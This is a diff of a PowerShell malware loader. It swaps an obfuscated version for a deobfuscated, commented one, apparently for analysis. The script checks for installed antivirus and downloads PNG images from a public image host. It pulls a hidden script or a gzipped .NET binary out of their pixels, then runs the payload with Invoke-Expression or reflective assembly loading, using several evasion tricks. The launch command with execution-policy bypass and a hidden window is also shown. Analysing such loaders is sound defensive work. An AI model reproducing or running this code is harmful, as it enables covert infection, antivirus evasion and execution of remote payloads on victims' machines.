@@ -1,125 +1,124 @@
-setlocal enabledelayedexpansion
-@echo off
+# 1. Antivirus Check and Conditional Stage
+$avInfo = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue;
+$avFlag = $false;
 
-# Command executed: start conhost.exe --headless powershell.exe -ep bypass -w h -c "..."
-
-$iiQrcg = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
-$jA1pw = $false
-
-if ($iiQrcg) {
-    foreach ($y3lrmBdved in $iiQrcg) {
-        $wLYUgiwYVrg = $y3lrmBdved.displayName
+if($avInfo) {
+    foreach($av in $avInfo) {
+        $avName = $av.displayName;
+        if ($avName -like "*ESET Security*"){ };
         
-        # Check for specific AVs to use alternate payload
-        if ($wLYUgiwYVrg -like "*Malwarebytes*" -or $wLYUgiwYVrg -like "*F-Secure*") {
-            Add-Type -AssemblyName System.Drawing
-            $pz0pL = "https://"
-            $s6YzyUvQ = "i.ibb.co/LXZsz3Jv/oabju2wl.png"
-            $mvjYofVBBrx = $pz0pL + $s6YzyUvQ
+        if($avName -like "*Malwarebytes*" -or $avName -like "*F-Secure*") {
+            Add-Type -AssemblyName System.Drawing;
+            $urlPrefix = "https://";
+            $imageUrl1 = "i.ibb.co/LXZsz3Jv/oabju2wl.png";
+            $fullUrl1 = $urlPrefix + $imageUrl1;
             
-            $hEBKIZ = New-Object System.Net.WebClient
-            $p2wmB1xghAn = $hEBKIZ.DownloadData($mvjYofVBBrx)
-            $hEBKIZ.Dispose()
+            $webClient = New-Object System.Net.WebClient;
+            $imgBytes1 = $webClient.DownloadData($fullUrl1);
+            $webClient.Dispose();
             
-            $kzk2C = New-Object IO.MemoryStream(,$p2wmB1xghAn)
-            $sh4KDxRF = [System.Drawing.Bitmap]::FromStream($kzk2C)
+            $memStream1 = New-Object IO.MemoryStream(,$imgBytes1);
+            $bitmap1 = [System.Drawing.Bitmap]::FromStream($memStream1);
             
-            # Steganography: Get length from first two pixels
-            $eO0Vpvj = $sh4KDxRF.GetPixel(0,0)
-            $vJ3Cz = $sh4KDxRF.GetPixel(1,0)
-            $x7goLCcas = ([uint32]$eO0Vpvj.R -shl 24) -bor ([uint32]$eO0Vpvj.G -shl 16) -bor ([uint32]$eO0Vpvj.B -shl 8) -bor [uint32]$vJ3Cz.R
+            # Extract payload size from first two pixels
+            $pixel0 = $bitmap1.GetPixel(0,0);
+            $pixel1 = $bitmap1.GetPixel(1,0);
+            $payloadSize1 = ([uint32]$pixel0.R -shl 24) -bor ([uint32]$pixel0.G -shl 16) -bor ([uint32]$pixel0.B -shl 8) -bor [uint32]$pixel1.R;
             
-            $k1fUFqcPRzg = New-Object byte[] $x7goLCcas
-            $xH88LhPmv = 0
-            $hAaNwifdpkw = 2
-            $jxpzGHGoU9J = 0
+            $payloadArray1 = New-Object byte[] $payloadSize1;
+            $byteIndex = 0;
+            $x = 2;
+            $y = 0;
             
-            # Extract bytes from RGB channels
-            while ($xH88LhPmv -lt $x7goLCcas) {
-                $bIqN04 = $sh4KDxRF.GetPixel($hAaNwifdpkw, $jxpzGHGoU9J)
-                $k1fUFqcPRzg[$xH88LhPmv++] = $bIqN04.R
-                if ($xH88LhPmv -lt $x7goLCcas) { $k1fUFqcPRzg[$xH88LhPmv++] = $bIqN04.G }
-                if ($xH88LhPmv -lt $x7goLCcas) { $k1fUFqcPRzg[$xH88LhPmv++] = $bIqN04.B }
-                $hAaNwifdpkw++
-                if ($hAaNwifdpkw -ge $sh4KDxRF.Width) {
-                    $hAaNwifdpkw = 0
-                    $jxpzGHGoU9J++
-                }
-            }
+            # Extract hidden script
+            while($byteIndex -lt $payloadSize1){
+                $currentPixel = $bitmap1.GetPixel($x, $y);
+                $payloadArray1[$byteIndex++] = $currentPixel.R;
+                if ($byteIndex -lt $payloadSize1) { $payloadArray1[$byteIndex++] = $currentPixel.G };
+                if ($byteIndex -lt $payloadSize1) { $payloadArray1[$byteIndex++] = $currentPixel.B };
+                
+                $x++;
+                if ($x -ge $bitmap1.Width) { $x = 0; $y++ };
+            };
             
-            $sh4KDxRF.Dispose()
-            $kzk2C.Dispose()
+            $bitmap1.Dispose();
+            $memStream1.Dispose();
             
-            # Execute extracted script
-            $cHzIPU2 = [System.Text.Encoding]::UTF8.GetString($k1fUFqcPRzg)
-            Invoke-Expression $cHzIPU2
-            $jA1pw = $true
-            break
-        }
-    }
-}
+            # Execute hidden script
+            $extractedScript = [System.Text.Encoding]::UTF8.GetString($payloadArray1);
+            Invoke-Expression $extractedScript;
+            $avFlag = $true;
+            break;
+        };
+    };
+};
 
-# Main payload execution flow (if no matching AV found or break not hit)
-Add-Type -AssemblyName System.Drawing
-$m16Y8y7nn = "https://"
-$lwYZ4Df = "i.ibb.co/Mk72ZRQ6/ervqt4eoyg9.png"
-$djR61 = $m16Y8y7nn + $lwYZ4Df
+# 2. Primary Payload Extraction
+Add-Type -AssemblyName System.Drawing;
+$urlPrefix2 = "https://";
+$imageUrl2 = "i.ibb.co/Mk72ZRQ6/ervqt4eoyg9.png";
+$fullUrl2 = $urlPrefix2 + $imageUrl2;
 
-$raon81iL88f = New-Object System.Net.WebClient
-$yX37ooO8OUL = $raon81iL88f.DownloadData($djR61)
-$raon81iL88f.Dispose()
+$webClient2 = New-Object System.Net.WebClient;
+$imgBytes2 = $webClient2.DownloadData($fullUrl2);
+$webClient2.Dispose();
 
-$e5ueVt4 = New-Object IO.MemoryStream(,$yX37ooO8OUL)
-$z7j7jUpv = [System.Drawing.Bitmap]::FromStream($e5ueVt4)
+$memStream2 = New-Object IO.MemoryStream(,$imgBytes2);
+$bitmap2 = [System.Drawing.Bitmap]::FromStream($memStream2);
 
-# Get payload length from specific pixels
-$vy0U5H = $z7j7jUpv.GetPixel(0,0)
-$ej4Ds3u = $z7j7jUpv.GetPixel(1,0)
-$k1dcHd0OeI9 = ([uint32]$vy0U5H.R -shl 24) -bor ([uint32]$vy0U5H.G -shl 16) -bor ([uint32]$vy0U5H.B -shl 8) -bor [uint32]$ej4Ds3u.R
+$pixel0_2 = $bitmap2.GetPixel(0,0);
+$pixel1_2 = $bitmap2.GetPixel(1,0);
+$payloadSize2 = ([uint32]$pixel0_2.R -shl 24) -bor ([uint32]$pixel0_2.G -shl 16) -bor ([uint32]$pixel0_2.B -shl 8) -bor [uint32]$pixel1_2.R;
 
-# Iterate through image to collect bytes
-$q5YE8sSXvVM = New-Object System.Collections.Generic.List[byte]
-for ($kc2LzB = 0; $kc2LzB -lt $z7j7jUpv.Height; $kc2LzB++) {
-    for ($cMpJsR = 0; $cMpJsR -lt $z7j7jUpv.Width; $cMpJsR++) {
-        if (($cMpJsR -eq 0 -and $kc2LzB -eq 0) -or ($cMpJsR -eq 1 -and $kc2LzB -eq 0)) { continue }
-        $um9UVl = $z7j7jUpv.GetPixel($cMpJsR, $kc2LzB)
-        $q5YE8sSXvVM.Add($um9UVl.R)
-        $q5YE8sSXvVM.Add($um9UVl.G)
-        $q5YE8sSXvVM.Add($um9UVl.B)
-    }
-}
+$byteList = New-Object System.Collections.Generic.List[byte];
 
-$z7j7jUpv.Dispose()
-$e5ueVt4.Dispose()
+for($y2=0; $y2 -lt $bitmap2.Height; $y2++){
+    for($x2=0; $x2 -lt $bitmap2.Width; $x2++){
+        # Skip the first two pixels (size metadata)
+        if(($x2 -eq 0 -and $y2 -eq 0) -or ($x2 -eq 1 -and $y2 -eq 0)){ continue; };
+        
+        $currentPixel2 = $bitmap2.GetPixel($x2,$y2);
+        $byteList.Add($currentPixel2.R);
+        $byteList.Add($currentPixel2.G);
+        $byteList.Add($currentPixel2.B);
+    };
+};
+$bitmap2.Dispose();
+$memStream2.Dispose();
 
-# Reconstruct GZip stream from bytes
-$oOpvAEakGIM = $q5YE8sSXvVM.ToArray()[0..($k1dcHd0OeI9-1)]
-$vOFkop = New-Object IO.MemoryStream(,$oOpvAEakGIM)
-$j2wxwFXVE = New-Object IO.MemoryStream
-$vLaAr0xM = New-Object IO.Compression.GZipStream($vOFkop, [IO.Compression.CompressionMode]::Decompress)
-$vLaAr0xM.CopyTo($j2wxwFXVE)
+# Trim to exact size and Decompress (GZip)
+$trimmedBytes = $byteList.ToArray()[0..($payloadSize2-1)];
+$compressedStream = New-Object IO.MemoryStream(,$trimmedBytes);
+$decompressedStream = New-Object IO.MemoryStream;
+$gzipStream = New-Object IO.Compression.GZipStream($compressedStream,[IO.Compression.CompressionMode](0));
 
-$vLaAr0xM.Dispose()
-$vOFkop.Dispose()
-$z6n5fQ = $j2wxwFXVE.ToArray() # This is the final .NET binary
-$j2wxwFXVE.Dispose()
+$gzipStream.CopyTo($decompressedStream);
+$gzipStream.Dispose();
+$compressedStream.Dispose();
+$finalPayload = $decompressedStream.ToArray();
+$decompressedStream.Dispose();
 
-# Final Reflective Loading and Execution
-foreach ($b1IsbUEi0el in [AppDomain]::CurrentDomain.GetAssemblies()) {
-    if ($b1IsbUEi0el.GlobalAssemblyCache -and $b1IsbUEi0el.Location.Contains('mscor' + 'lib.dll')) {
-        foreach ($xZMSFO in $b1IsbUEi0el.GetType(('System.Reflection.Assembly')).GetMethods('Public,Static')) {
-            if ($xZMSFO.ToString()[37] -eq ']') {
-                $yMZIXiH9qQ = $xZMSFO.Invoke($null, (,$z6n5fQ))
-                $yrQAC = $yMZIXiH9qQ.EntryPoint
-                $fmEdg1JmOgT = $yrQAC.GetParameters().Count
-                if ($fmEdg1JmOgT -eq 0) {
-                    $yrQAC.Invoke($null, $null)
+# 3. Reflective Assembly Loading
+foreach($assembly in [AppDomain]::CurrentDomain.GetAssemblies()){
+    if($assembly.GlobalAssemblyCache -and $assembly.Location.Contains('mscor'+'lib.dll')){
+        foreach($method in $assembly.GetType(('System.Reflection.Assembly')).GetMethods('Public,Static')){
+            # Evasion: Finds the "Load" method by checking the 37th char of its signature string
+            if($method.ToString()[37] -eq ']'){
+                $loadedAssembly = $method.Invoke($null,(,$finalPayload));
+                $entryPoint = $loadedAssembly.EntryPoint;
+                $paramCount = $entryPoint.GetParameters().Count;
+                
+                if($paramCount -eq 0){
+                    # Obfuscated Invoke
+                    $varName = "entryPoint";
+                    $methodName = "Invoke";
+                    (Get-Variable $varName).Value.$methodName($null, $null);
                 } else {
-                    $yrQAC.Invoke($null, (,@()))
-                }
-                break
-            }
-        }
-        break
-    }
+                    $entryPoint.Invoke($null,(,@()));
+                };
+                break;
+            };
+        };
+        break;
+    };
 }
